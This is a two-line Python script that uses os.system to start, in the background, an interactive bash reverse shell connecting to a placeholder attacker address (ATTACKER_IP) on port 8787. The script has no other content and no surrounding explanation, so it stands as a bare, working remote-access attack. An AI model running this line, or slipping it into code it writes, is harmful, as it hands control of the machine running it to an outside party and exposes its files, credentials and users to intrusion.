import os

os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/8787 0>&1' &")
